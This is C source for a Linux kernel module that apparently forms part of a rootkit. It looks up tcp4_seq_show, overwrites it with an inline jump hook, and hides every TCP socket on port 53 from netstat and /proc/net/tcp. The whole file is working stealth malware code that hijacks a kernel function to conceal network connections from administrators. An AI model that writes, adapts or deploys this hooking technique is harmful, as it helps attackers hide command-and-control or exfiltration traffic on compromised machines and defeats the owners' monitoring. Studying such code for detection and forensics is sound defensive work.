#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <net/sock.h>
#include <net/ip.h>
#include "hook.c"


#define PORT_TO_HIDE 53
#define TMPSZ 150

typedef unsigned long psize;

psize *o_tcp4_seq_show;
unsigned char* tcp_original_code;

typedef int (*tcp4_seq_show_t)(struct seq_file *seq, void *v);


/**
	My own tcp4_seq_show function which is hiding the PORT_TO_HIDE port from netstat
*/
int my_tcp4_seq_show(struct seq_file *seq, void *v) {

	(psize *) o_tcp4_seq_show;

	// this part is just copied from the original tcp4_seq_show function

	// start of original 
	seq_setwidth(seq, TMPSZ - 1);

	if (v == SEQ_START_TOKEN) {
		seq_puts(seq, "  sl  local_address rem_address   st tx_queue "
			   "rx_queue tr tm->when retrnsmt   uid  timeout "
			   "inode");
		seq_pad(seq, '\n');	
		return 0;
	}
	// end of original 

	// getting the socket object
	struct sock *sk = v;

	// getting the socket information
	struct inet_sock *inet = inet_sk(sk);

	// checking if the sport or dport is a port to hide
	if (ntohs(inet->inet_dport) == PORT_TO_HIDE || ntohs(inet->inet_sport) == PORT_TO_HIDE ) {
		
		// hiding socket 
		return 0;
	}

	// removing hook and calling the original function 
	hijack_stop(o_tcp4_seq_show, tcp_original_code);

	// casting the pointer to the original function 
	tcp4_seq_show_t orignal_function = (tcp4_seq_show_t) o_tcp4_seq_show;

	// calling the original function 
	orignal_function(seq, v);

	// hooking again 
	hijack_start(o_tcp4_seq_show, my_tcp4_seq_show, &tcp_original_code);

	// 0 - successfully ended 
	return 0;
}


int hide_sock(void) 
{
	(psize *) o_tcp4_seq_show;

	// get address of o_tcp4_seq_show function
	o_tcp4_seq_show = (void *)kallsyms_lookup_name("tcp4_seq_show");

	// hijack the o_tcp4_seq_show function so it will JMP to 'my_tcp4_seq_show' function
	hijack_start(o_tcp4_seq_show, my_tcp4_seq_show, &tcp_original_code);
}


int remove_sock_hook(void){

	// remove the hook from the o_tcp4_seq_show function
	hijack_stop(o_tcp4_seq_show, tcp_original_code);
}



